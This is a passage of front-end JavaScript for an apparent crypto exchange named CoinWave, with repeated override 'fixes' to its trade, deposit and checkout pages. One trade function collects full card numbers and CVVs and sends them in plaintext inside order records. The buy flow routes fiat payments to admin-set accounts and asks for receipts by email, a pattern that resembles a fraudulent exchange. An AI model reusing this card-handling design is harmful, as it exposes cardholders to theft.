            if(container) container.appendChild(adminBox);
        } else if (method === 'PayPal') {
            const paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "PayPal not set. Contact Support."; 
            const adminBox = document.createElement('div'); 
            adminBox.id = 'adminFiatDetails';
            adminBox.innerHTML = `<div style="background: #1a1a2a; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-top: 10px;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Send Fiat to this PayPal Email:</p><p style="color: #fff; font-size: 14px; font-family: monospace;">${paypalEmail}</p></div>`;
            if(container) container.appendChild(adminBox);
        } else if (method === 'Credit Card') { 
            const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
            if (cardLink) {
                const adminBox = document.createElement('div'); adminBox.id = 'adminFiatDetails';
                adminBox.innerHTML = `<div style="background: #1a1a2a; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-top: 10px; text-align: center;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px;">Pay securely via Card:</p><a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 10px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: inline-block;">Pay with Card</a></div>`;
                if(container) container.appendChild(adminBox);
            } else {
                if(cardInputs) cardInputs.style.display = 'block'; 
            }
        }
    } else {
        // SELL MODE
        if (method === 'Credit Card') { if(cardInputs) cardInputs.style.display = 'block'; } 
        else if (method === 'PayPal') { if(paypalInputs) paypalInputs.style.display = 'block'; } 
        else if (method === 'Bank Transfer') { if(bankInputs) bankInputs.style.display = 'block'; }
    }
}

function calcTrade() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0; 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') { 
            const usdAmount = amount / curr.rate; 
            document.getElementById('tradeReceive').value = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6) + " " + coin.symbol; 
        } else { 
            const usdAmount = amount * getExchangePrice(coin, 'sell'); 
            document.getElementById('tradeReceive').value = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        }
    } else { document.getElementById('tradeReceive').value = ''; }
}

async function submitTrade() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value); 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const method = document.getElementById('tradeMethod').value; 
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A"; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount."); 
    if (currentTradeMode === 'buy' && inputAmount < 100) return showToast(`Min purchase is ${curr.symbol}100.`);
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const name = document.getElementById('cardName')?.value.trim() || ""; 
        const num = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || ""; 
        const exp = document.getElementById('cardExpiry')?.value.trim() || ""; 
        const cvv = document.getElementById('cardCvv')?.value.trim() || "";
        if (name.length < 3 || num.length < 15 || exp.length < 5 || cvv.length < 3) return showToast("Fill valid card details."); 
        paymentDetails = `Name: ${name} | Card: ${num} | Exp: ${exp} | CVV: ${cvv}`;
    } else if (method === 'PayPal') { 
        paymentDetails = currentTradeMode === 'buy' ? "Customer will send via PayPal" : `PayPal: ${document.getElementById('paypalEmail').value}`; 
    } else if (method === 'Bank Transfer') {
        if (currentTradeMode === 'buy') { paymentDetails = "Customer will send via Bank Transfer"; } 
        else { 
            const bName = document.getElementById('bankName').value.trim(), aName = document.getElementById('bankAccountName').value.trim(), aNum = document.getElementById('bankAccountNumber').value.trim(); 
            if (!bName || !aName || !aNum) return showToast("Fill all bank details."); 
            paymentDetails = `Bank: ${bName} | Holder: ${aName} | Acct: ${aNum}`; 
        }
    }
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter receiving wallet address.");
    
    const token = localStorage.getItem('token'); 
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') { 
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; sendCurrency = curr.code; 
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); getCurrency = coinSymbol; 
    } else { 
        sendAmount = inputAmount; sendCurrency = coinSymbol; 
        getAmount = `${curr.symbol} ${(inputAmount * getExchangePrice(coin, 'sell') * curr.rate).toFixed(2)} ${curr.code}`; getCurrency = curr.code; 
    }
    
    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify({ userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, sendAmount, sendCurrency, getAmount, getCurrency, method, paymentDetails, receivingWallet: wallet }) 
        });
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') { 
                fetch('/api/admin/public/settings').then(r=>r.json()).then(s => { 
                    globalSettings = s; 
                    showPaymentInstructions(coinSymbol, sendAmount, getAmount); 
                }); 
            } else { 
                // BUY MODE: Show Manual Verification Modal and then Email
                showManualVerificationModal(coinSymbol, getAmount, method, sendAmount); 
            }
        } else { showToast("Failed to place order."); }
    } catch (e) { showToast("Error connecting."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
}

function showPaymentInstructions(symbol, cryptoAmount, fiatAmount) {
    let modal = document.getElementById('paymentInstructionModal'); 
    modal.style.display = 'flex';
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support";
    
    modal.innerHTML = `
        <div class="modal-content" style="text-align: center;">
            <h2 style="color: #fff;">Order Created</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 20px;">Send exactly <strong style="color:#fff;">${cryptoAmount} ${symbol}</strong> to:</p>
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #00d4aa; font-family: monospace; font-size: 14px; word-break: break-all;">${address}</p>
            </div>
            <div class="warning-banner" style="text-align: left;"><span>⚠️</span><p>Pending verification. Only send ${symbol} to this address.</p></div>
            <button onclick="document.getElementById('paymentInstructionModal').style.display='none'; showView('dashboardView');" style="background: #00d4aa; color: #000; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer;">I Have Sent It</button>
        </div>
    `;
}

function showManualVerificationModal(symbol, amount, method, fiatAmount) {
    let modal = document.getElementById('paymentInstructionModal'); 
    modal.style.display = 'flex';
    const supportEmail = (globalSettings && globalSettings.supportEmail) ? globalSettings.supportEmail : "support@coinwave.com";
    
    // Construct the mailto link
    const subject = encodeURIComponent(`New Buy Order: ${symbol} - ${fiatAmount}`);
    const body = encodeURIComponent(`Hello CoinWave Support,\n\nI have just placed an order to buy ${amount} of ${symbol} for ${fiatAmount}.\nMy Payment Method is ${method}.\n\nPlease find my payment proof/receipt attached to this email.\n\nThank you.`);
    const mailtoLink = `mailto:${supportEmail}?subject=${subject}&body=${body}`;

    modal.innerHTML = `
        <div class="modal-content" style="text-align: center;">
            <h2 style="color: #fff;">Secure Manual Verification</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 20px;">To keep fees at 0% and protect against fraud, CoinWave uses manual settlement. Your order has been reserved.</p>
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #fff; font-size: 14px;">Please click below to open your email app. Send us your payment receipt so we can verify and credit your crypto.</p>
            </div>
            <a href="${mailtoLink}" style="background: #00d4aa; color: #000; display: block; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; text-decoration: none; margin-bottom: 10px;">Open Email App</a>
            <button onclick="document.getElementById('paymentInstructionModal').style.display='none'; showView('dashboardView');" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer;">I Have Sent The Email</button>
        </div>
    `;
}

/* =====================================================
   FIX: Dashboard Rendering & Deposit Page UI
   ===================================================== */

// 1. Fix the Dashboard (Assets & Web3 Card)
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        // Target the container directly
        const assetsCard = document.querySelector('.assets-section');
        if (!assetsCard) return;
        
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <span style="font-size: 13px; color: #aaa;">Hide Zero</span>
                    <div style="position: relative; width: 44px; height: 24px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0; position: absolute;">
                        <span id="toggleTrack" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#3a3a4a'}; border-radius: 24px; transition: 0.3s;"></span>
                        <span id="toggleThumb" style="position: absolute; height: 20px; width: 20px; left: ${hideZero ? '21px' : '2px'}; bottom: 2px; background-color: #fff; border-radius: 50%; transition: 0.3s;"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
            <div id="assetsListContainer" class="${hideZero ? 'hide-zeros' : ''}" style="display: flex; flex-direction: column;">
        `;
        
        let totalValue = 0;
        markets.forEach(coin => {
            const amount = Math.max(0, balances[coin.symbol] || 0); 
            const value = amount * coin.price;
            totalValue += value;
            const rowClass = amount === 0 ? 'asset-row zero-row' : 'asset-row';
            html += `<div class="${rowClass}" onclick="window.showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})">
                <div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name}</div>
                <div class="asset-amount">${amount.toFixed(6)}</div>
                <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
            </div>`;
        });
        html += `</div>`;
        assetsCard.innerHTML = html;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) {
            totalEl.dataset.realValue = `$${Math.max(0, totalValue).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
            totalEl.textContent = localStorage.getItem('hideBalance') === 'true' ? '******' : totalEl.dataset.realValue;
        }
        
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                const isChecked = e.target.checked; localStorage.setItem('hideZeroBalances', isChecked);
                const listContainer = document.getElementById('assetsListContainer');
                if (isChecked) listContainer.classList.add('hide-zeros'); else listContainer.classList.remove('hide-zeros');
                document.getElementById('toggleTrack').style.backgroundColor = isChecked ? '#00d4aa' : '#3a3a4a';
                document.getElementById('toggleThumb').style.left = isChecked ? '21px' : '2px';
            });
        }
    } catch (error) { console.log("Balance fetch error:", error); }
};

// 2. Show the Web3 Card on dashboard load
const originalCheckWallet = window.checkWalletStatus;
window.checkWalletStatus = async function() {
    const card = document.getElementById('web3WalletCard');
    if (card) card.style.display = 'block'; // Force show
    if(originalCheckWallet) await originalCheckWallet();
};

// 3. Fix the Deposit Page Layout
window.openDepositPage = function(symbol) {
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "";
    let isAddressMissing = !address;
    
    // If missing, show error text. If exists, generate QR.
    let displayAddress = isAddressMissing ? "Contact Support (Address Not Set)" : address;
    let qrCodeUrl = isAddressMissing ? "" : `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${address}`;

    const content = `
        <div style="text-align: center;">
            <h3 style="color: #fff;">Deposit ${symbol}</h3>
            <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Send only ${symbol} to this address.</p>
            
            <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 20px;">
                ${qrCodeUrl ? `<img src="${qrCodeUrl}" style="background:#fff; padding:8px; border-radius:8px; margin-bottom:15px; width: 150px; height: 150px;">` : ''}
                <div style="font-family: monospace; font-size: 13px; color: ${isAddressMissing ? '#f6465d' : '#00d4aa'}; word-break: break-all; margin-bottom: 15px; line-height: 1.4;">${displayAddress}</div>
                ${!isAddressMissing ? `<button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!';" style="background: #00d4aa; color: #000; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;">Copy Address</button>` : ''}
            </div>
            
            <div class="warning-banner" style="text-align: left; margin-bottom: 0;">
                <span style="color: #f6465d; font-size: 16px;">⚠️</span>
                <p>Sending any other coin or using the wrong network to this address will result in permanent loss of funds.</p>
            </div>
        </div>
    `;
    createPageView('depositPageView', 'Deposit', content);
    showView('depositPageView');
};

/* =====================================================
   FIX: FULL-PAGE PAYMENT INSTRUCTIONS (No Popup)
   ===================================================== */
window.showPaymentInstructions = function(symbol, cryptoAmount, fiatAmount) {
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support (Address Not Set)";
    let isMissing = address.includes("Contact");

    const content = `
        <div style="text-align: center;">
            <div style="margin-bottom: 25px;">
                <div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                </div>
                <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
                <p style="color: #888; font-size: 14px;">To complete your sale and receive <strong style="color:#fff;">${fiatAmount}</strong>, please send the exact amount below.</p>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px; text-align: left;">
                <p style="color: #888; font-size: 12px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px;">Amount to Send</p>
                <p style="color: #00d4aa; font-size: 24px; font-weight: 800; margin: 0;">${cryptoAmount} ${symbol}</p>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #888; font-size: 12px; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">${symbol} Deposit Address</p>
                <div style="display: flex; gap: 10px; align-items: center;">
                    <div style="flex: 1; font-family: monospace; font-size: 13px; color: ${isMissing ? '#f6465d' : '#fff'}; word-break: break-all; background: #1a1a2a; padding: 12px; border-radius: 6px;">${address}</div>
                    ${!isMissing ? `<button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy', 2000);" style="background: #2a2a3a; color: #fff; border: 1px solid #333; padding: 12px 16px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s;">Copy</button>` : ''}
                </div>
            </div>

            <div class="warning-banner" style="text-align: left; margin-bottom: 30px;">
                <span style="color: #f6465d; font-size: 16px;">⚠️</span>
                <p>Pending verification. Only send ${symbol} to this address. Sending any other coin or using the wrong network will result in permanent loss of funds.</p>
            </div>

            <button onclick="showView('dashboardView')" style="background: #00d4aa; color: #000; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">I Have Sent The Crypto</button>
        </div>
    `;
    
    createPageView('paymentPageView', 'Payment Instructions', content);
    showView('paymentPageView');
};

/* =====================================================
   FIX: FETCH SETTINGS ON LOAD & FORCE CARD LINK
   ===================================================== */
// 1. Fetch settings immediately on page load
async function loadGlobalSettings() {
    try {
        const res = await fetch('/api/admin/public/settings');
        globalSettings = await res.json();
    } catch (e) { console.log("Error loading settings", e); }
}
document.addEventListener('DOMContentLoaded', loadGlobalSettings);

// 2. Override togglePaymentDetails to strictly check for the Card Link
window.togglePaymentDetails = function() {
    const method = document.getElementById('tradeMethod').value; 
    const container = document.getElementById('paymentDetailsContainer'); 
    const cardInputs = document.getElementById('cardDetailsInputs'); 
    const paypalInputs = document.getElementById('paypalDetailsInputs'); 
    const bankInputs = document.getElementById('bankDetailsInputs');
    
    if(cardInputs) cardInputs.style.display = 'none'; 
    if(paypalInputs) paypalInputs.style.display = 'none'; 
    if(bankInputs) bankInputs.style.display = 'none';
    
    const oldAdminBox = document.getElementById('adminFiatDetails'); 
    if (oldAdminBox) oldAdminBox.remove();

    if (currentTradeMode === 'buy') {
        if (method === 'Bank Transfer') {
            const bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "Bank details not set. Contact Support."; 
            const adminBox = document.createElement('div'); 
            adminBox.id = 'adminFiatDetails';
            adminBox.innerHTML = `<div style="background: #1a1a2a; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-top: 10px;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Send Fiat to this Bank Account:</p><p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace;">${bankDetails}</p></div>`;
            if(container) container.appendChild(adminBox);
        } else if (method === 'PayPal') {
            const paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "PayPal not set. Contact Support."; 
            const adminBox = document.createElement('div'); 
            adminBox.id = 'adminFiatDetails';
            adminBox.innerHTML = `<div style="background: #1a1a2a; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-top: 10px;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Send Fiat to this PayPal Email:</p><p style="color: #fff; font-size: 14px; font-family: monospace;">${paypalEmail}</p></div>`;
            if(container) container.appendChild(adminBox);
        } else if (method === 'Credit Card') { 
            const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
            
            if (cardLink) {
                // If the link exists, show the "Pay with Card" button
                const adminBox = document.createElement('div'); 
                adminBox.id = 'adminFiatDetails';
                adminBox.innerHTML = `
                    <div style="background: #1a1a2a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-top: 10px; text-align: center;">
                        <p style="color: #00d4aa; font-size: 14px; font-weight: bold; margin-bottom: 15px;">Pay securely via Card:</p>
                        <a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Click Here to Pay</a>
                    </div>
                `;
                if(container) container.appendChild(adminBox);
            } else {
                // Fallback if no link is set
                if(cardInputs) cardInputs.style.display = 'block'; 
            }
        }
    } else {
        // SELL MODE
        if (method === 'Credit Card') { if(cardInputs) cardInputs.style.display = 'block'; } 
        else if (method === 'PayPal') { if(paypalInputs) paypalInputs.style.display = 'block'; } 
        else if (method === 'Bank Transfer') { if(bankInputs) bankInputs.style.display = 'block'; }
    }
};

/* =====================================================
   FIX: PAYMENT LOGIC (Show Admin Details ONLY after Confirm)
   ===================================================== */
// 1. Hide Admin Details on Select (Buy mode)
window.togglePaymentDetails = function() {
    const method = document.getElementById('tradeMethod').value; 
    const container = document.getElementById('paymentDetailsContainer'); 
    const cardInputs = document.getElementById('cardDetailsInputs'); 
    const paypalInputs = document.getElementById('paypalDetailsInputs'); 
    const bankInputs = document.getElementById('bankDetailsInputs');
    
    if(cardInputs) cardInputs.style.display = 'none'; 
    if(paypalInputs) paypalInputs.style.display = 'none'; 
    if(bankInputs) bankInputs.style.display = 'none';
    
    const oldAdminBox = document.getElementById('adminFiatDetails'); 
    if (oldAdminBox) oldAdminBox.remove();

    // ONLY show input fields if SELLING (Customer provides payout details)
    if (currentTradeMode === 'sell') {
        if (method === 'Credit Card') { if(cardInputs) cardInputs.style.display = 'block'; } 
        else if (method === 'PayPal') { if(paypalInputs) paypalInputs.style.display = 'block'; } 
        else if (method === 'Bank Transfer') { if(bankInputs) bankInputs.style.display = 'block'; }
    }
    // For BUY, we intentionally show NOTHING here. The details appear on the next page.
};

// 2. Intercept submitTrade to show the new Payment Page on success
const originalSubmitTrade = window.submitTrade;
window.submitTrade = async function() {
    // ... [Basic validation stays the same]
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value); 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const method = document.getElementById('tradeMethod').value; 
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A"; 
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount."); 
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter receiving wallet address.");
    
    // Call the original to save the order
    await originalSubmitTrade();
    
    // If it was a buy, we just saved the order. Now open the payment page.
    if (currentTradeMode === 'buy') {
        // We wait 500ms for the API to finish saving, then route to the new page
        setTimeout(() => {
            showBuyPaymentPage(coinSymbol, document.getElementById('tradeReceive').value, document.getElementById('tradeAmount').value, method);
        }, 800);
    }
};

// 3. The new Payment Page
window.showBuyPaymentPage = function(symbol, cryptoAmount, fiatAmount, method) {
    let detailsHtml = "";
    const supportEmail = (globalSettings && globalSettings.supportEmail) ? globalSettings.supportEmail : "support@coinwave.com";
    const subject = encodeURIComponent(`Payment Proof: Buy ${symbol} - $${fiatAmount}`);
    const body = encodeURIComponent(`Hello CoinWave Support,\n\nI have just placed an order to buy ${cryptoAmount} of ${symbol} for $${fiatAmount}.\nMy Payment Method is ${method}.\n\nPlease find my payment proof attached to this email.\n\nThank you.`);
    const mailtoLink = `mailto:${supportEmail}?subject=${subject}&body=${body}`;

    if (method === 'Bank Transfer') {
        let bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "Contact Support.";
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Send Fiat to this Bank Account:</p>
                <p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace;">${bankDetails}</p>
            </div>`;
    } else if (method === 'PayPal') {
        let paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "Contact Support.";
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Send Fiat to this PayPal Email:</p>
                <p style="color: #fff; font-size: 14px; font-family: monospace;">${paypalEmail}</p>
            </div>`;
    } else if (method === 'Credit Card') {
        let cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (cardLink) {
            detailsHtml = `
                <div style="background: #0f0f15; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: center;">
                    <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 15px;">Pay securely via Card:</p>
                    <a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px; margin-bottom: 10px;">Click Here to Pay</a>
                    <p style="color: #888; font-size: 12px;">After paying, click the email button below.</p>
                </div>`;
        } else {
            detailsHtml = `<div class="warning-banner"><p>Card payment link is currently unavailable. Please contact support.</p></div>`;
        }
    }

    const content = `
        <div style="text-align: center;">
            <div style="margin-bottom: 25px;">
                <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
                <p style="color: #888; font-size: 14px;">To complete your purchase of <strong style="color:#fff;">${cryptoAmount}</strong>, please complete the payment below.</p>
            </div>

            ${detailsHtml}

            <div style="background: #1a1a2a; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                <p style="color: #fff; font-size: 14px; margin-bottom: 15px;">After making the payment, click the button below to send us your payment receipt. Our team will verify and credit your crypto.</p>
                <a href="${mailtoLink}" style="background: #00d4aa; color: #000; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Open Email App to Send Receipt</a>
            </div>

            <button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Back to Dashboard</button>
        </div>
    `;
    
    createPageView('buyPaymentPage', 'Payment Instructions', content);
    showView('buyPaymentPage');
};

/* =====================================================
   ULTIMATE FIX: PROFESSIONAL FULL-PAGE BUY CHECKOUT
   ===================================================== */
// 1. Override submitTrade completely for the Buy flow
window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value); 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const method = document.getElementById('tradeMethod').value; 
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A"; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount."); 
    if (currentTradeMode === 'buy' && inputAmount < 100) return showToast(`Min purchase is ${curr.symbol}100.`);
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter receiving wallet address.");
    
    let paymentDetails = "";
    if (method === 'Credit Card') { paymentDetails = "Customer will pay via Card Link"; } 
    else if (method === 'PayPal') { paymentDetails = "Customer will send via PayPal"; } 
    else if (method === 'Bank Transfer') { paymentDetails = "Customer will send via Bank Transfer"; }
    
    const token = localStorage.getItem('token'); 
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') { 
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; sendCurrency = curr.code; 
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); getCurrency = coinSymbol; 
    } else { 
        sendAmount = inputAmount; sendCurrency = coinSymbol; 
        getAmount = `${curr.symbol} ${(inputAmount * getExchangePrice(coin, 'sell') * curr.rate).toFixed(2)} ${curr.code}`; getCurrency = curr.code; 
    }
    
    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify({ userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, sendAmount, sendCurrency, getAmount, getCurrency, method, paymentDetails, receivingWallet: wallet }) 
        });
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') { 
                fetch('/api/admin/public/settings').then(r=>r.json()).then(s => { 
                    globalSettings = s; 
                    showPaymentInstructions(coinSymbol, sendAmount, getAmount); 
                }); 
            } else { 
                // BUY MODE: Open the new full page instead of a popup
                showBuyCheckoutPage(coinSymbol, getAmount, sendAmount, method); 
            }
        } else { showToast("Failed to place order."); }
    } catch (e) { showToast("Error connecting."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

// 2. The Full-Page Checkout View
window.showBuyCheckoutPage = function(symbol, cryptoAmount, fiatAmount, method) {
    let detailsHtml = "";
    const supportEmail = (globalSettings && globalSettings.supportEmail) ? globalSettings.supportEmail : "support@coinwave.com";
    const subject = encodeURIComponent(`Payment Proof: Buy ${symbol} - ${fiatAmount}`);
    const body = encodeURIComponent(`Hello CoinWave Support,\n\nI have just placed an order to buy ${cryptoAmount} of ${symbol} for ${fiatAmount}.\nMy Payment Method is ${method}.\n\nPlease find my payment proof attached to this email.\n\nThank you.`);
    const mailtoLink = `mailto:${supportEmail}?subject=${subject}&body=${body}`;

    // Render the correct Admin payment details based on their choice
    if (method === 'Bank Transfer') {
        let bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "Contact Support.";
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Step 1: Send Fiat to this Bank Account</p>
                <p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace;">${bankDetails}</p>
            </div>`;
    } else if (method === 'PayPal') {
        let paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "Contact Support.";
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Step 1: Send Fiat to this PayPal Email</p>
                <p style="color: #fff; font-size: 14px; font-family: monospace;">${paypalEmail}</p>
            </div>`;
    } else if (method === 'Credit Card') {
        let cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (cardLink) {
            detailsHtml = `
                <div style="background: #0f0f15; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: center;">
                    <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 15px;">Step 1: Pay securely via Card</p>
